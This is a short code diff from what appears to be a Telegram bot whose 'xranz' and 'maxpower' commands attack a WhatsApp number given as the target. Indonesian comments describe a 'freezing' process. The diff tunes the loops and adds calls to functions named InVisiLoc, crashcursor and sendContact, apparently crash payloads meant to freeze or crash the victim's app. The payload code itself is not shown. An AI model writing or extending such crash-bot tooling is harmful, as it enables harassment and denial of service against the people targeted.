@@ -1459,8 +1459,11 @@ bot.command("xranz", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 5; i++) {
+  for (let i = 0; i < 3; i++) {
         await InVisiLoc(target, { ptcp: true });
+        await InVisiLoc(target, { ptcp: true });
+        await sendContact(target, { ptcp: true });
+        
   }
 
   // Menyelesaikan proses response
@@ -1484,7 +1487,7 @@ bot.command("maxpower", cooldownMiddleware, checkWhatsAppConnection, async ctx =
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 5; i++) {
+  for (let i = 0; i < 2; i++) {
     await crashcursor(target, { ptcp: true });
     await InVisiLoc(target, { ptcp: true });
   }
